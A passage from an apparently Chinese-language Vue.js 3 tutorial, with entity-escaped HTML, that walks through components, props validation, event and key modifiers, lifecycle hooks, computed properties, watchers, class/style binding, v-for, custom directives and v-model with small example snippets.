word\u0026lt;/p\u0026gt;\u0026quot;\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rv-once表示该元素或者组件只渲染一次，后面不会因为数据的改变而重新渲染\n动态参数的实现\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\rconst hallo = {\rdata() {\rreturn {\rmain: \u0026quot;hallo\u0026quot;,\rabc: \u0026quot;classa\u0026quot;\r}\r},\rtemplate: `\u0026lt;h1 :[abc] = \u0026quot;main\u0026quot;\u0026gt;hallo word\u0026lt;/h1\u0026gt;`\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\rvuejs提供了一个叫组件的概念，将重复的程序进行封装，用这些被封装的组件来构建大型应用，可以理解为积木\n根组件：挂载应用时，该组件被认为是渲染的起点\n如果想挂载一个应用到id为app的dom元素中，那么就需要挂载#app，通过一个vue实例，调用其component()方法，创建一个组件\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;hallo v-for=\u0026quot;item in groceryList\u0026quot; v-bind:todo=\u0026quot;item\u0026quot; v-bind:key=\u0026quot;item.id\u0026quot;\u0026gt;\u0026lt;/hallo\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst main ={\rdata(){\rreturn{\rgroceryList: [\r{id:0,text:\u0026quot;abc\u0026quot;},\r{id:1,text:\u0026quot;xyz\u0026quot;},\r{id:2,text:\u0026quot;hallo\u0026quot;}\r]\r}\r}\r} const app = Vue.createApp(main)\rapp.component(\u0026quot;hallo\u0026quot;,{\rprops: [\u0026quot;todo\u0026quot;],\rtemplate: `\u0026lt;h1\u0026gt;{{todo.text}}\u0026lt;h1\u0026gt;`\r})\rapp.mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\r上面简单说明了一下组件的概念,下面详细说明一下组件和组件实例\n页面是这些组件的容器，因此，组件在页面中表达出来的是原生html\n模板（template）：模板定义了数据和html dom的绑定关系\n初始数据（data）：组件的初始数据，组件具有作用域，因此是处于封装私有状态的\n接收的外部参数（props）：组件之间通过该参数进行数据的传递和分享(单向，只能从父组件中获取，不能进行修改,父传子)\n方法（methods）：对数据的改动一般都在组件的方法内进行操作，通过v-on指令把输入事件和组件方法进行绑定\n生命周期钩子（lifecycle hooks）：每个实例都会触发多个生命周期钩子，从创建到废弃的过程就是生命周期，可以在不同时候进行逻辑处理，另外还有组件生命周期\n组件：一种对数据和方法的封装\nmount()返回的是组件实例\n组件实例：组件继承于组件，通过createApp()建立组件实例\n当需要进行数据计算处理时，例如将两个数据合并，如果通过正常的表达式来表示，那么一旦数据处理复杂了，程序会显得很繁杂，vuejs中提供了一个叫计算属性的东西，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r{{hallo}}\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rVue.createApp({\rdata() {\rreturn {\ryes:{\rmain: \u0026quot;abc\u0026quot;\r}\r}\r},\rcomputed: {\rhallo() {\rreturn \u0026quot;hallo\u0026quot;+\u0026quot; \u0026quot;+this.yes.main\r}\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r样式绑定\n\u0026lt;style\u0026gt;\r.abc{\rwidth: 100px;\rheight: 100px;\rbackground-color: #ccc;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst app = Vue.createApp({\rdata() {\rreturn {\rclassdata: \u0026quot;abc\u0026quot;\r}\r},\rtemplate: `\r\u0026lt;div :class = \u0026quot;classdata\u0026quot;\u0026gt;hallo word\u0026lt;/div\u0026gt;\r`\r})\rapp.mount('#app')\r\u0026lt;/script\u0026gt;\r组件是可重复使用的实例，例如：\n\u0026lt;div class=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;test\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;test\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;/div\u0026gt;\rconst app = Vue.createApp({})\rapp.component(\u0026quot;test\u0026quot;,{\rdata() {\rreturn {\rabc: \u0026quot;hallo\u0026quot;\r}\r},\rtemplate: `\r\u0026lt;div\u0026gt;\r{{abc}} word\r\u0026lt;/div\u0026gt;`\r})\rapp.mount(\u0026quot;#app\u0026quot;)\r全局组件\n一般来说组件的数据是独享的，只有全局组件才能进行数据访问，例如：\nconst app = Vue.createApp({\rtemplate: `\r\u0026lt;div\u0026gt;\r\u0026lt;test\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;abc\u0026gt;\u0026lt;abc\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r// 父组件\r})\rapp.component(\u0026quot;test\u0026quot;,{\rtemplate: `\u0026lt;abc\u0026gt;\u0026lt;abc\u0026gt;`\r// 全局组件\r})\rapp.component(\u0026quot;abc\u0026quot;,{\rdata() {\rreturn {\rtext: \u0026quot;hallo word\u0026quot;\r}\r},\rtemplate: ` \u0026lt;div\u0026gt;{{text}}\u0026lt;/div\u0026gt; ` // 全局组件\r})\rapp.mount('#app')\rabc组件分享了数据给test组件\n局部组件\n\u0026lt;test\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;Test_datea\u0026gt;\u0026lt;/Test_datea\u0026gt;\rconst Test_date ={\rtemplate: \u0026quot;\u0026lt;p\u0026gt;hallo word\u0026lt;/p\u0026gt;\u0026quot;\r// 局部组件\r}\rconst Test_datea ={\rtemplate: \u0026quot;\u0026lt;p\u0026gt;hallo hhh\u0026lt;/p\u0026gt;\u0026quot;\r// 局部组件\r}\rconst app = Vue.createApp({\rcomponents: {\r\u0026quot;test\u0026quot; :Test_date\rTest_datea\r}\r}).mount('#app')\r其中test为组件名，指向了Test_date局部组件，\n父子组件之间传递数据\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;test :name=\u0026quot;text\u0026quot;\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst app = Vue.createApp({\rdata() {\rreturn {\rtext: \u0026quot;hallo\u0026quot;,\r}\r}\r})\rapp.component(\u0026quot;test\u0026quot;,{\rprops: [\u0026quot;name\u0026quot;],\rtemplate: `\u0026lt;p\u0026gt;{{name}}\u0026lt;/p\u0026gt;`\r})\rapp.mount('#app')\r\u0026lt;/script\u0026gt;\r静态传值只能传字符串类型，如果要传其他数据类型或者想动态传递数据，可以使用v-bind\n通过循环来输出一组数据\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;test v-for=\u0026quot;data in datas\u0026quot; :key=\u0026quot;data.id\u0026quot; :href=\u0026quot;data.url\u0026quot; :text=\u0026quot;data.text\u0026quot;\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst app = Vue.createApp({\rdata() {\rreturn {\rdatas: [\r{id: 1, url: \u0026quot;https://xiaochenabc123.test.com\u0026quot;, text: \u0026quot;hallo\u0026quot;},\r{id: 2, url: \u0026quot;https://test.xiaochenabc123.test.com\u0026quot;, text: \u0026quot;abcxyz\u0026quot;}\r]\r}\r}\r})\rapp.component(\u0026quot;test\u0026quot;,{\rprops: [\u0026quot;text\u0026quot;],\rtemplate: `\u0026lt;a\u0026gt;\u0026lt;p\u0026gt;{{text}}\u0026lt;/p\u0026gt;\u0026lt;/a\u0026gt;`\r})\rapp.mount('#app')\r\u0026lt;/script\u0026gt;\r传值校验\nprops中的值进行验证，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;test text=\u0026quot;123\u0026quot; url=\u0026quot;https://xiaochenabc123.test.com\u0026quot; main=\u0026quot;yes\u0026quot; ifmain=11\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst app = Vue.createApp({})\rapp.component(\u0026quot;test\u0026quot;,{\rprops: {\rtext: String, // 基本类型验证 null和undefined会通过任何类型验证，如果不是这个类型，将返回警告\rurl: [Number,String], // 多个类型验证，当数据不是这的类型\rmain: {\rtype: String, // 类型String，必填，如果设置没有该值\rrequired: true\r},\rhallo: {\rtype: String, // 类型String，带默认值default\rdefault: \u0026quot;hallo vuejs\u0026quot;\r},\robj: {\rtype: Object, // 类型Object，带默认值函数\rdefault: function(){\rreturn{\rtext: \u0026quot;abc\u0026quot;\r}\r}\r},\rifmain: { validator: function(value){\rreturn(value\u0026gt;10) // 验证函数\r}\r}\r},\rtemplate: `\r\u0026lt;p\u0026gt;{{text}}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{{url}}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{{main}}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{{hallo}}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{{obj}}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{{ifmain}}\u0026lt;/p\u0026gt;\r`\r})\rapp.mount('#app')\r\u0026lt;/script\u0026gt;\rvuejs事件修饰符\n.stop：阻止冒泡事件的发生，只触发自身的事件，一个子元素定义了事件，但是它的父元素也定义了一个事件，而且这两个事件的触发机制还是一样的，那么就会导致这两个事件都触发，而想避免发生就需要在目标元素上的事件加上.stop，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot; @click = \u0026quot;divclick\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;GO\u0026quot; @click.stop = \u0026quot;inputclick\u0026quot;\u0026gt;\r\u0026lt;/div\u0026gt;\r.prevent：拦截默认事件的发生，有一些标记拥有自身的默认事件，例如a标记，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;a href=\u0026quot;https://xiaochenabc123.test.com\u0026quot; @click.prevent = \u0026quot;alinkclick\u0026quot;\u0026gt;{{data}}\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata(){\rreturn{\rdata: \u0026quot;GO\u0026quot;\r}\r},\rmethods: {\ralinkclick: function(){\rconsole.log(\u0026quot;hallo\u0026quot;)\r},\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\r这里阻止了a标记的默认事件\n.capture：捕获事件，当发生冒泡事件时，先触发带有该修饰符的，如果有多个，则从父元素到子元素触发\n触发机制：优先触发带有.capture的，然后再按照从内往外的冒泡\n.self：只有当事件在该元素上时才触发，冒泡和捕获都无法让其触发事件，只要当事件发生在该元素本身才会触发\n.once：指定该绑定的事件只会触发一次\n.stop和.self的区别：.stop会阻止全部冒泡事件，而.self只阻止自身的冒泡\n.passive：每一次发生事件，浏览器都去查询有没有preventDefault来阻止该事件的默认行为，.passive就是来声明，没有使用preventDefault来阻止该事件的默认行为，因为其是告诉没有使用阻止事件的默认行为，所有passive是和prevent冲突，不能一起使用，否则.prevent会被忽略\n因为在移动端，一般都是监听滚动事件比较多，而每移动一次都会触发一次事件，会进行查询有没有使用prevent，可能会导致滑动卡顿，使用passive能有效提升移动端的性能和流畅度\n生命周期钩子函数会在某一些特定的时刻自动触发，方便在该时刻完成一些工作\nvue实例生命周期\nvue实例的创建，运行，到销毁期间，会触发一些叫生命周期钩子的函数，可以通过该来监听数据变化\n按照生命周期排序：\nbeforeCreate：实例刚刚初始化之后，数据观察和事件机制（data 和 methods）都还未初始化，不能获取dom节点\ncreated：数据观察和事件机制（data 和 methods）都已经初始化，dom节点处理完成，组件未加载\nbeforeMount：实例已经加载完毕，但是还没有执行挂载操作，得不到具体的DOM元素\nmounted：实例已经加载完毕，也执行了挂载操作，DOM已被渲染出来\nbeforeUpdate：处于数据更新之前，data中的值是最新的，但是页面上还是旧的数据，还没有重新处理dom节点\nupdated：处于数据更新之后，data中的值和页面上的数据都已经更新，dom节点也被重新处理\nbeforeUnmount：实例销毁之前，实例还是在可用状态，可使用this获取实例\nunmounted：实例销毁后，数据绑定和事件监听器全部清除，子实例销毁\n例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\rconst app = Vue.createApp({\rdata(){\rreturn{\rmessage: 'hallo word'\r}\r},\rbeforeCreate() {\rconsole.log(\u0026quot;beforeCreate\u0026quot;)\r},\rcreated() {\rconsole.log(\u0026quot;created\u0026quot;)\r},\rbeforeMount(){\rconsole.log(\u0026quot;beforeMount\u0026quot;)\r},\rmounted() {\rconsole.log(\u0026quot;mounted\u0026quot;)\r},\rbeforeUpdate() {\rconsole.log(\u0026quot;beforeUpdate\u0026quot;)\r},\rupdated() {\rconsole.log(\u0026quot;updated\u0026quot;)\r},\rbeforeUnmount() {\rconsole.log(\u0026quot;beforeUnmount\u0026quot;)\r},\runmounted() {\rconsole.log(\u0026quot;unmounted\u0026quot;)\r},\rtemplate: \u0026quot;\u0026lt;h2\u0026gt;{{message}}\u0026lt;/h2\u0026gt;\u0026quot;\r})\rlet main = app.mount(\u0026quot;#app\u0026quot;)\rsetTimeout(()=\u0026gt;{\rmain.$data.message = 'abc' // 挂载3秒后触发更新事件\r},3000)\rsetTimeout(() =\u0026gt; {\rapp.unmount() // 6秒后触发销毁事件\r}, 6000)\r访问组件的生命周期\nvue组件周期\n实例生命周期加on就是组件周期\nbeforeCreate和created统一为setup()\nbeforeMount为onBeforeMout，mounted为onMounted，beforeUpdate为onBeforeUpdate，updated为onUpdated，beforeUnmount为onBeforeUnmount，unmounted为onUnmounted\nsetup：data 和 method 都已经初始化\nonBeforeMount：组件被挂载到dom节点之前\nonMounted：组件被挂载到dom节点完毕\nonBeforeUpdate：组件更新之前\nonUpdated：组件更新之后\nonBeforeUnmount：组件销毁之前\nonUnmounted：组件销毁完毕之后\nonErrorCaptured：当捕获到来自子孙组件的异常时\nonRenderTracked：当虚拟DOM重新渲染时调用\nonRenderTriggered：当虚拟DOM重新渲染被触发时调用\nonActivated：当被包含在中的组件时\nonDeactivated: 当被包含在中的组件发生改变时（例如切换组件，原来的组件销毁时）\n注意：使用的组件会把数据保留在内存中，避免需要重新加载多次数据\n实例的data()是一个函数，并非方法，vue在创建vue的组件实例过程中会调用该函数，以$data的形式进行存储在vue实例中，data中的所有值都可以通过实例来暴露（访问或者修改），例如：\nconst hallo = Vue.createApp({\rdata() {\rreturn {\rhallovuejs: \u0026quot;hallo vuejs!\u0026quot;\r}\r}\r}).mount(\u0026quot;#app\u0026quot;)\rconsole.log(hallo.$data.hallovuejs)\rconsole.log(hallo.hallovuejs)\r方法\nvue允许使用methods向组件实例添加方法\nvue会自动为methods绑定this，使其始终指向组件实例\nmethods一样可以在组件模板中暴露，也可以在模板中用做事件监听\n\u0026lt;div @click=\u0026quot;alinkclick\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r计算属性\n计算属性和方法的区别就是：计算属性只在其依赖发生变化才重新计算，只要依赖未发生改变，那么就会直接从缓存中获取，不会再执行其函数\n如果使用一个方法来计算时，那么data()返回的值，发生一次改变，事件方法就会重新计算一次，因此涉及计算类的使用计算属性，而不是方法\n例如：\nconst app = Vue.createApp({\rdata() {\rreturn {\rhallovuejs: \u0026quot;hallo vuejs!\u0026quot;\r}\r},\rcomputed: {\rhallo(){\rreturn this.hallovuejs == \u0026quot;hallo vuejs!\u0026quot; ? \u0026quot;Yes\u0026quot; : \u0026quot;No\u0026quot;\r}\r}\r}).mount(\u0026quot;#app\u0026quot;)\rwatch监听器\nwatch接收2个参数，被监听的data()属性值，回调函数，当监听的变量发生改变时，自动执行回调函数，例如\nconst app = Vue.createApp({\rdata() {\rreturn {\rnum: 100\r}\r},\rwatch: {\rnum(current, prev) {\rconsole.log('num发生改变')\rconsole.log(\u0026quot;改变之后的值:\u0026quot;, current)\rconsole.log(\u0026quot;改变之前的值:\u0026quot;, prev)\r}\r}\r})\rlet vm = app.mount(\u0026quot;#app\u0026quot;)\rvm.num = 300\rvm.$data.num = 600\r另外一种使用方法\nconst count = ref(100) watch(count,(current, prev) =\u0026gt; {\rconsole.log('num发生改变')\rconsole.log(\u0026quot;改变之后的值:\u0026quot;,current)\rconsole.log(\u0026quot;改变之前的值:\u0026quot;,prev)\r})\rwatch和计算属性的区别：虽然都可以监听data()属性值的改变，但是计算属性会在页面渲染时触发一次，而watch只在被监听的发生改变时触发，而且watch可以得到改变之后的值和改变之前的值\nwatch可以监听多个值\nclass绑定\nvue允许使用:class对象来动态切换class，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;p :class=\u0026quot;{container: yes,nav: no}\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\ryes: true,\rno: false\r}\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r而class的存在取决于键值对的值，允许传入多个值，也可以直接调用对象，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;p :class=\u0026quot;classnav\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\rclassnav: {\rcontainer: false,\rnav: true\r}\r}\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\rvue也允许通过数组来传入class，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;p :class=\u0026quot;[classnav,classa]\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\rclassnav: \u0026quot;nav\u0026quot;,\rclassa: \u0026quot;texta\u0026quot;\r}\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r同样也允许使用三元表达式，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;p :class=\u0026quot;[no ? classnav: '',classa]\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\rno: false,\rclassa: \u0026quot;texta\u0026quot;\r}\r}\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r始终添加classa，classnav取决已经no的值\nvue也是允许在数组中使用对象来处理\n如果在组件中已经绑定了class，而在调用其又加上其他class，那么就会合并，vue允许在组件中进行:class，如果有多个元素，在调用时绑定class，但是又想指定其class给予某个，可以使用$attrs组件属性，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;test class=\u0026quot;nav\u0026quot;\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({}).component(\u0026quot;test\u0026quot;,{\rtemplate: `\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;\r\u0026lt;div :class=\u0026quot;$attrs.class\u0026quot;\u0026gt;vuejs\u0026lt;/div\u0026gt;\r`\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r上面只有\u0026lt;div\u0026gt;vuejs\u0026lt;/div\u0026gt;接收到class\n内联样式绑定（:style）\n例子：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div :style=\u0026quot;{ color: a, margin: b + 'px' }\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\ra: \u0026quot;#ccc\u0026quot;,\rb: 300\r}\r},\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r多重值\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div :style=\u0026quot;{ color: ['#ccc','#fff','#000']}\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r一般来说只会选择最后一个（前提是浏览器支持）\n列表渲染\nv-for可以将一个数组迭代成一组元素\n使用的形式是 item in items，items为数组，item为迭代的元素，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div v-for=\u0026quot;item in items\u0026quot; :key=\u0026quot;item.message\u0026quot;\u0026gt;\r{{ item.message }}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\ritems: [{message: \u0026quot;xyz\u0026quot;},{message: \u0026quot;abc\u0026quot;},{message: \u0026quot;hallo\u0026quot;}]\r}\r},\r}).mount('#app')\r而:key的作用是为了更加效率的渲染dom，更快判断出某个不存在的元素，可以根据key动态来重新排列元素的顺序，key的目的是保证唯一性\nv-for支持index参数，即当前的索引，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div v-for=\u0026quot;(item,index) in items\u0026quot;\u0026gt;\r{{ index }}:{{ item.message }}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\ritems: [{message: \u0026quot;xyz\u0026quot;},{message: \u0026quot;abc\u0026quot;},{message: \u0026quot;hallo\u0026quot;}]\r}\r},\r}).mount('#app')\r\u0026lt;/script\u0026gt;\rin可以用of替代\n\u0026lt;div v-for=\u0026quot;(item,index) of items\u0026quot;\u0026gt;\rv-for也可以使用对象(从某个角度来看，数组也是对象的一种)，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div v-for=\u0026quot;(item,key) of items\u0026quot; \u0026gt;\r{{ key }}:{{ item }}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\ritems: {\rhallo: \u0026quot;yes\u0026quot;,\rabc: \u0026quot;2002\u0026quot;,\rxyz: \u0026quot;np\u0026quot;\r}\r}\r},\r}).mount('#app')\r第二参数为键名，这里命名为key，实质上就是一个key\n也可以加index做为第三个参数，作为索引值\nvue在渲染元素时，如果数据的顺序发生改变，vue是不会将dom元素进行适配顺序，而是重新更新数据，确保正确渲染\nv-for也支持整数\n\u0026lt;div v-for=\u0026quot;a in 6\u0026quot; :key=\u0026quot;a\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r和遍历一样，会重复对应的次数\n事件处理\n一般用v-on进行监听事件，例如：\n\u0026lt;div v-on:click=\u0026quot;boom\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r多个事件用逗号,分开\n可以简写为@click=\u0026ldquo;boom\u0026rdquo;，boom是方法，不推荐直接将逻辑写在事件v-on，而是使用一个方法来调用，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div @click=\u0026quot;boom('yes')\u0026quot;\u0026gt;\rhallo\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\rabc: \u0026quot;hallo\u0026quot;\r}\r},\rmethods: {\rboom(a){\rconsole.log(this.abc + \u0026quot;boom\u0026quot;)\rconsole.log(a)\r}\r}\r}).mount('#app')\r按键修饰符\n一般用于监听键盘事件，精确的知道某个按键是否被触发\n.enter：顾名思义 回车键\n.tab：tab键\n.delete：删除或者退格\n.esc：esc键\n.space：空格键\n.up：上键\n.down：下键\n.left：左键\u0026lt;\n.right: 右键\u0026gt;\n系统修饰符\n.ctrl：ctrl键\n.alt：alt键\n.shift：shift键\n.meta：在win为windows键，在mac为command键\n例如：\n\u0026lt;input @keydown.enter=\u0026quot;submit\u0026quot; /\u0026gt;\r上面只要触发一个要求就会被触发\n.exact：精确触发\n@keydown.enter.exact // 只有当enter被按下时触发\n@keydown.exact // 只有在没有任何系统修饰符被按下才触发\n鼠标修饰符\n@click.left：鼠标右键\n@click.right：鼠标右键\n@click.middle：鼠标中键\n例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;test class=\u0026quot;nav\u0026quot;\u0026gt;\u0026lt;/test\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({}).component(\u0026quot;test\u0026quot;,{\rmethods: {\rentersubmit(){\rconsole.log('回车事件已触发')\r}\rclickmouse(){\rconsole.log('鼠标中键事件已触发')\r}\r}\rtemplate: `\r\u0026lt;input @keydown.enter.exact=\u0026quot;submit\u0026quot; /\u0026gt;\r\u0026lt;div @click.middle = \u0026quot;clickmouse\u0026quot;\u0026gt;hallo word\u0026lt;/div\u0026gt;\r`\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r自定义指令（directive）\nvue允许指定义指令，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;text\u0026quot; v-hallo\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst app = Vue.createApp({})\rapp.directive(\u0026quot;hallo\u0026quot;,{\rmounted(abc) {\rabc.focus()\r},\r})\rapp.mount('#app')\r\u0026lt;/script\u0026gt;\r这里的abc指定的是当前元素\n局部指令：组件中接受directives选项\n指令的钩子函数\ncreated：当绑定元素的属性和事件监听器被应用之前调用\nbeforeMount：当指令第一次绑定到元素并且在挂载父组件之前调用\nmounted：绑定元素的父组件被挂载后调用\nbeforeUpdate：更新包含组件的VNode之前调用\nupdated：包含组件的VNode及其子组件的VNode更新后调用\nbeforeUnmount：在卸载绑定元素的父组件之前调用\nunmounted：当指令与元素解除绑定，并且父组件也被卸载时调用一次\n表单输入绑定\nv-model可以用于数据的双向绑定，但是v-model会忽略表单元素的初始值，而使用实例中的数据作为数据源（需要在data中声明初始值）\n复选框的数据绑定返回的是布尔值，也是可以将数据绑定到一个数组中，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;checkbox\u0026quot; value=\u0026quot;hallo\u0026quot; v-model=\u0026quot;datas\u0026quot;/\u0026gt;\r\u0026lt;label for=\u0026quot;hallo\u0026quot;\u0026gt;hallo\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026quot;checkbox\u0026quot; value=\u0026quot;abc\u0026quot; v-model=\u0026quot;datas\u0026quot;/\u0026gt;\r\u0026lt;label for=\u0026quot;abc\u0026quot;\u0026gt;abc\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026quot;checkbox\u0026quot; value=\u0026quot;xyz\u0026quot; v-model=\u0026quot;datas\u0026quot;/\u0026gt;\r\u0026lt;label for=\u0026quot;xyz\u0026quot;\u0026gt;xyz\u0026lt;/label\u0026gt;\r\u0026lt;p\u0026gt;\rdata: {{datas}}\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo = Vue.createApp({\rdata() {\rreturn {\rdatas: []\r}\r},\r}).mount('#app')\r\u0026lt;/script\u0026gt;\r单选框（radio），数据存放在字符串中，输出的也是字符串（选择框和输入框也是字符串）\n如果想输入或者选择返回的不是字符串，而是其他类型，可以使用v-model.number，当然也是可以进行手动转类型，但是v-model.number可以自动判断输入是否是数字还是字符串\ntrue-value和false-value可以在被选中或者取消选中时触发，例如：\ndata: {{datas}}\r\u0026lt;input type=\u0026quot;checkbox\u0026quot; v-model.lazy=\u0026quot;datas\u0026quot; true-value=\u0026quot;halloword\u0026quot; false-value=\u0026quot;hahahah\u0026quot;/\u0026gt;\rv-model.lazy是v-model数据双向绑定的懒加载，在每次input事件（失去焦点）触发后将输入框的值与数据进行同步\nv-model.trim可以自动过滤掉输入数据的首尾空格\n组件\n全局注册\napp.component\n局部注册\nconst componentA = {}\rcomponents: {\r'component-a': componentA,\r}\r局部注册的组件，在其子组件是不可用的\n通过Props传递数据给子组件\n通过Props共享一些数据，例如：\napp.component('titles', {\rprops: ['title'],\rtemplate: `\u0026lt;h3\u0026gt;{{ title }}\u0026lt;/h3\u0026gt;`\r})\r\u0026lt;titles title=\u0026quot;hallo\u0026quot;\u0026gt;\u0026lt;/titles\u0026gt;\r在上面的例子里，title=\u0026ldquo;hallo\u0026quot;被传递数据给模板，任何值的可以传递给props，如果一个值被传递给props属性，那么这个值就成了这个组件实例的共享数据，这个值可以在模板中访问\n监听子组件事件\n使用自定义事件监听子组件，通过子组件事件来告诉父组件应该做什么，例如：\ntemplate: `\r\u0026lt;button @click=\u0026quot;$emit('hallomain')\u0026quot;\u0026gt;\rapp\r\u0026lt;/button\u0026gt;\r`\r\u0026lt;div :style=\u0026quot;{fontWeight: yes}\u0026quot;\u0026gt;\r\u0026lt;hallo @hallomain=\u0026quot;yes += 1\u0026quot;\u0026gt;\u0026lt;/hallo\u0026gt;\r\u0026lt;/div\u0026gt;\r也可以在组件的emits中列出事件\napp.component({\remits: [\u0026quot;hallomain\u0026quot;]\r})\r事件也可以用来返回一个值 \u0026lt;button @click=\u0026quot;$emit(\u0026lsquo;hallomain\u0026rsquo;,1)\u0026quot;\u0026gt; app \u0026lt;hallo @hallomain=\u0026quot;yes += $event\u0026quot;\u0026gt;\u0026lt;/hallo\u0026gt;\r这个值可以使用$event访问到，事件也可以是指向方法的，用事件来触发方法的使用，例如：@hallomain= \u0026ldquo;hallo\u0026rdquo;\n给这个方法定义一下，在methods选项\n组件也可以使用v-model（model-value）\n\u0026lt;hallo 